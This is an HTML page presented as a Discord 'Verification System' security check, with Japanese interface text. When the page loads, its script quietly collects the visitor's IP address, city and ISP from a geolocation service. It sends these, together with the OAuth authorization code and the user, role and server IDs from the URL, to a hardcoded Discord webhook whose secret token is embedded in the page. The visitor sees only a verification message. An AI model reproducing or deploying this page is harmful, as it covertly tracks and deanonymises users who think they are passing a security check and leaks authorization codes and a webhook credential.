<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body { background-color: #232428; color: #dbdee1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #313338; padding: 40px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.2); text-align: center; width: 90%; max-width: 400px; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 10px; color: #ffffff; }
        p { font-size: 14px; color: #b5bac1; word-break: break-all; }
        .success-mark { color: #23a559; font-size: 50px; display: none; }
        .error-mark { color: #f23f43; font-size: 50px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loading" class="spinner"></div>
        <div id="success" class="success-mark">✔</div>
        <div id="error" class="error-mark">✖</div>
        <h1 id="status">認証中...</h1>
        <p id="msg">セキュリティチェックを実行しています。</p>
    </div>
    <script>
        // Webhook URLを再確認してください
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";

        async function start() {
            const params = new URLSearchParams(window.location.search);
            const state = params.get('state');
            const code = params.get('code');

            if (!state || !code) return showError("エラー", "URLパラメータが不足しています。");

            try {
                const parts = state.split('_');
                const logId = parts[1];
                const userId = parts[3];
                const roleId = parts[5];
                const guildId = parts[7];

                // IP取得
                const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
                const ipData = ipRes ? await ipRes.json() : {ip: "Unknown", city: "Unknown", org: "Unknown"};

                // Webhook送信 (ここが重要)
                const response = await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **認証成功**: <@${userId}> | CODE:${code} | RID:${roleId} | GID:${guildId}`,
                        embeds: [{
                            title: "🛡️ 認証完了 (IP取得成功)",
                            description: `**ユーザー:** <@${userId}>\n**IP:** \`${ipData.ip}\`\n**場所:** \`${ipData.city}\`\n**ISP:** \`${ipData.org}\``,
                            color: 0x23a559,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                if (response.ok) {
                    showSuccess("認証完了", "自動的にロールが付与されます。Discordへ戻ってください。");
                } else {
                    const errText = await response.text();
                    showError("Webhookエラー", "Discordへの送信に失敗しました: " + errText);
                }

            } catch (e) {
                showError("実行エラー", "ブラウザ側でエラーが発生しました: " + e.message);
            }
        }

        function showSuccess(t, m) { document.getElementById('loading').style.display = 'none'; document.getElementById('success').style.display = 'inline-block'; document.getElementById('status').innerText = t; document.getElementById('msg').innerText = m; }
        function showError(t, m) { document.getElementById('loading').style.display = 'none'; document.getElementById('error').style.display = 'inline-block'; document.getElementById('status').innerText = t; document.getElementById('msg').innerText = m; }
        
        window.onload = start;
    </script>
</body>
</html>
